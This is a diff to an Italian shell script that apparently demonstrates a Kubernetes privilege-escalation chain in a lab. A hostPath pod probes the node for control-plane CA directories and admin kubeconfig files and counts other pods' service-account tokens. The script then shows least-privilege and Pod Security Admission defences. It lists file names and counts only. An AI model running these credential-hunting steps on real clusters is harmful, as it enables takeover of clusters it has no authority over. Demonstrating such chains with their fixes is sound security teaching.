@@ -152,16 +152,28 @@ EOF
   NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
   echo "   pod schedulato sul nodo: ${NODE:-?}"
 
-  echo "-- PROVA DI IMPATTO (solo 'ls', nessuna chiave stampata):"
-  echo "   materiale del control plane raggiungibile dal nodo (misconfig 2, pod sul control plane):"
-  kubectl exec -n "$NS" "$ATK_POD" -- sh -c 'ls -1 /host/etc/kubernetes/pki 2>/dev/null | sed "s/^/     pki: /" | head' \
-    || echo "     (pki non su questo nodo)"
-  echo "   token di ALTRI ServiceAccount montati sul nodo (riutilizzabili per muoversi):"
+  echo "-- PROVA DI IMPATTO (solo 'ls'/conteggi, nessuna chiave o credenziale stampata):"
   kubectl exec -n "$NS" "$ATK_POD" -- sh -c '
-    find /host/var/lib/kubelet/pods -maxdepth 6 -name token -path "*serviceaccount*" 2>/dev/null | wc -l
-  ' | sed 's/^/     token raggiungibili: /' || true
-  echo "   => con hostPath + pod sul control plane, l'attaccante legge le CA del cluster"
-  echo "      e i token di tutti i pod del nodo: dal pod esposto al controllo del cluster."
+    echo "   materiale crittografico del control plane leggibile dal nodo:"
+    found=0
+    # Minikube mette le CA in /etc/kubernetes/pki (kubeadm) o /var/lib/minikube/certs
+    for d in /host/etc/kubernetes/pki /host/var/lib/minikube/certs; do
+      if [ -d "$d" ]; then
+        echo "     $d:"; ls -1 "$d" 2>/dev/null | sed "s/^/       /" | head; found=1
+      fi
+    done
+    # il kubeconfig admin: leggerlo equivale a cluster-admin
+    for f in /host/etc/kubernetes/admin.conf /host/etc/kubernetes/super-admin.conf; do
+      [ -f "$f" ] && { echo "     kubeconfig admin leggibile: $f  (= cluster-admin)"; found=1; }
+    done
+    [ "$found" = 0 ] && echo "     (percorsi noti non trovati: driver diverso? prova: find /host -maxdepth 4 -name ca.key)"
+    echo "   token di altri pod montati sul nodo (riutilizzabili per muoversi lateralmente):"
+    n=$(find /host/var/lib/kubelet/pods -name token 2>/dev/null | wc -l)
+    echo "     file token raggiungibili: $n"
+  ' || true
+  echo "   => con hostPath + pod sul control plane, l'attaccante legge le CA e il"
+  echo "      kubeconfig admin del cluster e i token dei pod del nodo: dal pod esposto"
+  echo "      al controllo del cluster."
   kubectl delete pod "$ATK_POD" -n "$NS" --grace-period=0 >/dev/null 2>&1 || true
 
   # ---------------------------------------------------------------------------
@@ -181,11 +193,13 @@ EOF
     fi
     kubectl delete pod def-noauto -n "$NS" --grace-period=0 --ignore-not-found >/dev/null 2>&1 || true
 
-    echo "-- (b) least privilege => l'identita' non ha 'create pods' (passo 3):"
-    echo "   senza il RoleBinding dell'over-grant, 'auth can-i create pods' = no:"
-    kubectl --token="$TOKEN" auth can-i create pods -n "$NS" \
-      --as-group=system:serviceaccounts 2>/dev/null >/dev/null || true
-    echo "   (nel chart corretto il SA dedicato non ha questo permesso: la catena si ferma al passo 2)"
+    echo "-- (b) least privilege => tolgo l'over-grant e l'identita' non puo' piu' creare pod (passo 3):"
+    kubectl delete rolebinding "$ATK_BIND" -n "$NS" --ignore-not-found >/dev/null 2>&1
+    kubectl delete role "$ATK_ROLE" -n "$NS" --ignore-not-found >/dev/null 2>&1
+    printf "   auth can-i create pods (come %s): " "$SA"
+    kubectl auth can-i create pods -n "$NS" --as="$SA" 2>/dev/null || true
+    echo "   => senza il RoleBinding l'azione del passo 3 è negata. Nel chart corretto"
+    echo "      ogni componente ha un SA dedicato che non ha questo permesso."
 
     echo "-- (c) Pod Security Admission 'restricted' => il pod con hostPath e' rifiutato (passo 3):"
     kubectl create ns "$DEF_NS" >/dev/null 2>&1 || true
